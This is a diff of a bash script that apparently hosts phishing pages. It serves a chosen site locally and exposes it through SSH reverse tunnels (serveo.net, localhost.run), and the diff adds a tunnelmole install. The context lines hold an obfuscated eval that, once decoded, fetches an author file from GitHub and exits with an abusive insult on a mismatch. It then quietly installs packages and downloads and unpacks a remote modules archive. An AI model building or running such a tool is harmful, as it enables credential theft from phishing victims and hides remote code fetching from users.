@@ -20,6 +20,11 @@ z="
 ";dBz='php ';yBz='down';gBz='-y >';fBz='ssh ';qBz='hub.';gz='en';dz='eato';GBz='[ -d';PCz='ull ';Xz='OR)';Bz='tor=';TBz='nts.';cz=' $cr';Fz='ttps';iBz='v/nu';rBz='com/';Vz='lib/';jz='\n\e';EBz=' ""';az='UTHO';Kz='rcon';Lz='tent';vBz='om/r';xBz='ses/';JCz=' mod';qz='ode ';Sz='/hea';SCz='rf m';kz='[31;';PBz='ig a';tBz='4You';ez='r ]]';sBz='Anon';DBz='echo';mz='bhi ';mBz=' -LO';LCz='.tar';bz='R !=';Gz='://r';lBz='curl';nz='to k';ZBz='"';RCz='rm -';wz='n\e[';CCz='0-te';MCz='.gz ';NBz='"Ins';ACz='load';aBz='apt ';OBz='tall';cBz='all ';Nz='/Ano';Zz='[ $A';Mz='.com';uBz='/Ven';wBz='elea';QBz='ll r';oz='hud ';FCz='ar.g';sz='le m';SBz='reme';Yz='if [';vz='...\';eBz='open';KBz=']]; ';LBz='then';XBz='ome ';Az='crea';Rz='refs';NCz='> /d';pz='se c';Qz='nom/';hBz=' /de';HBz=' ".M';KCz='ules';Ez='sL h';Wz='AUTH';GCz='z';Dz='rl -';pBz='/git';Tz='ds/m';RBz='equi';kBz='>&1';IBz='odul';Pz='u/Ve';QCz='2>&1';Jz='buse';jBz='ll 2';MBz=' -e ';CBz='else';BBz='exit';OCz='ev/n';HCz='tar ';uz='chod';nBz=' htt';DCz='st/m';VBz='y ta';Oz='n4Yo';UBz='. ma';YBz='time';Cz='$(cu';BCz='/v1.';Iz='ithu';yz='slee';bBz='inst';oBz='ps:/';Hz='aw.g';lz='1mKa';xz='0m"';JBz='es" ';WBz='ke s';hz='prin';tz='adar';ABz='p 2';fz='; th';FBz='fi';iz='tf "';Uz='ain/';ICz='-zxf';rz='kar ';ECz='es.t';
 eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$z$Yz$Zz$az$bz$cz$dz$ez$fz$gz$z$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz$uz$vz$wz$xz$z$yz$ABz$z$BBz$z$CBz$z$DBz$EBz$z$FBz$z$Yz$GBz$HBz$IBz$JBz$KBz$LBz$z$DBz$EBz$z$CBz$z$DBz$MBz$NBz$OBz$PBz$QBz$RBz$SBz$TBz$UBz$VBz$WBz$XBz$YBz$ZBz$z$aBz$bBz$cBz$dBz$eBz$fBz$gBz$hBz$iBz$jBz$kBz$z$lBz$mBz$nBz$oBz$pBz$qBz$rBz$sBz$tBz$uBz$vBz$wBz$xBz$yBz$ACz$BCz$CCz$DCz$IBz$ECz$FCz$GCz$z$HCz$ICz$JCz$KCz$LCz$MCz$NCz$OCz$PCz$QCz$z$RCz$SCz$IBz$ECz$FCz$GCz$z$FBz"
 
+if ! hash tmole > /dev/null 2>&1; then
+  apt install nodejs -y 
+  npm -g install tunnelmole
+fi
+
 # Banner & Menu Don't change Author name
 main(){
 clear
@@ -353,19 +358,19 @@ hosting(){
   printf "\e[32;1mStarting PHP server...\r"
   php -S localhost:8080 -t .vnm/$website > /dev/null 2>&1 &
   sleep 2
-#  printf "Starting serveo.net...\r"
- # ssh -R 80:localhost:8080 serveo.net > .srvlog 2> /dev/null &
- # sleep 10
-  printf "Starting localhost.run...\r"
+  printf "Starting tunnulmols tunnel...\r"
+  ssh -R 80:localhost:8080 serveo.net > .srvlog 2> /dev/null &
+  sleep 3
+  printf "Starting localhost tunnel...\r"
   ssh -R 80:localhost:8080 nokey@localhost.run > .lhrlog 2> /dev/null &
   sleep 10
-#  link=$(grep -o 'https://[-0-9a-z]*\.serveo.net' ".srvlog")
+  link=$(grep -o 'https://[-0-9a-z]*\.tunnelmole.net' ".srvlog")
   lhlink=$(grep -o 'https://[-0-9a-z]*\.lhr.life' ".lhrlog")
   rm -rf .lhrlog .srvlog
   echo -e "\e[32;1myour links are given bellow \e[34;1m\n"
-#  echo Serveo.net : $link
+  echo Public Link : $link
   echo ""
-  echo Localhost.run : $lhlink
+  echo Public Link : $lhlink
   echo -e "\nLocalHost  : http://localhost:8080"
   datafound
 }
